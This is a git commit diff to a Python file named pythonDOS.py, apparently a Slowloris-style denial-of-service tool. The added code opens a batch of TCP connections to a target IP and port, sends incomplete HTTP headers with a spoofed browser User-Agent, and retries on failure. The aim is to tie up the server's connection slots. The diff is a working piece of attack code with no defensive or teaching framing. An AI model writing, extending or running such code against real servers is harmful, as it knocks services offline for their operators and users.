5346afc1ce9c4aafa23e78755df67c842d46b758
sWallyx <mikelsmartinez@aol.com>
2019-10-31 20:52:14 +0000

    create new sockets

--- pythonDOS.py
+++ pythonDOS.py
@@ -13,7 +13,20 @@ class pythonDOS():
             "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
             "Accept-Language: en-us,en;q=0.5"
         ]
+        self._sockets = [self.newSocket() for _ in range(socketsCount)]
 
+    def newSocket(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4)
+            s.connect((self._ip, self._port))
+            for header in self._headers:
+                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
+            return s
+        except socket.error as se:
+            print("Error: "+str(se))
+            time.sleep(0.5)
+            return self.newSocket()
 
 # Main function
 if __name__ == "__main__":
